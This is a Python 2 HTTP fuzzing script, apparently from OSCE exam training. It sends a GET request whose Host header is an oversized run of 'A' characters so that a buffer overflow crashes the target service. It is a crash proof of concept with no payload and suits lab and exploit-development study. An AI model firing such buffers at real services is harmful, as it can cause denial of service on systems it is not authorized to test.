#!/usr/bin/python

#
# This python script is to be used for HTTP fuzzing
# I created it during Module 0x08 of OSCE
# It is designed for a target with a Host Header buffer overflow vulnerability
# If / when we see another one, this tool will assist
# If you want to use it for a different HTTP Header, just move the variable crash to the appropriate spot
#
import socket
import os
import sys

#
# I stole this from OSCP Beta
# I have no idea what I am doing
#

#
# Five arguments, including the script itself, ask me how I know
#
if len(sys.argv) != 5:
    print "[-] Usage: ./http_fuzzer <ip> <port> <url> <size of buffer>\n" 
    print "[-] Example: ./http_fuzzer 192.168.100.127 7510 </topology/home> 2000\n"
    print "[-] Try Harder!\n"
    sys.exit()

#
# Guess how many times I mixed ip and url?
#
ip = sys.argv[1]
port = int(sys.argv[2])
url = sys.argv[3]
size = int(sys.argv[4])

#
# Port and Size here need to be expressed as integers
#

crash = "A" * size

buffer="GET " + url + " HTTP/1.1\r\n"
buffer+="Host: " + crash + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows NT 10.0) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1001024\r\n\r\n"

#
# I actually had "sending even buffer"
#
print "[-] Here we going, sending evil buffer!\n\n"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(buffer)
expl.close

# Spoiler, if you want to watch in WireShark, filter by tcp.port not protocol
# Ask me how I know 

print "[-] Done, check debugger homie\n"

exit()
